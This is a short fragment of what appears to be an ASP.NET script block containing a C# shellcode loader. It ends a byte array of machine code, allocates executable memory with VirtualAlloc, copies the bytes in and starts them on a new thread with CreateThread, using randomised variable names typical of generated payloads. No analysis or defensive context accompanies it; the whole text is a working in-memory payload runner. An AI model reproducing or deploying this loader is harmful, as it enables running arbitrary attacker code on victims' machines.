...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr q0Uihc = VirtualAlloc(IntPtr.Zero,(UIntPtr)iU8Rnb.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(iU8Rnb,0,q0Uihc,iU8Rnb.Length);
        IntPtr zL0__YUKf = IntPtr.Zero;
        IntPtr tCrwjKBSC4 = CreateThread(IntPtr.Zero,UIntPtr.Zero,q0Uihc,IntPtr.Zero,0,ref zL0__YUKf);
    }
</script>
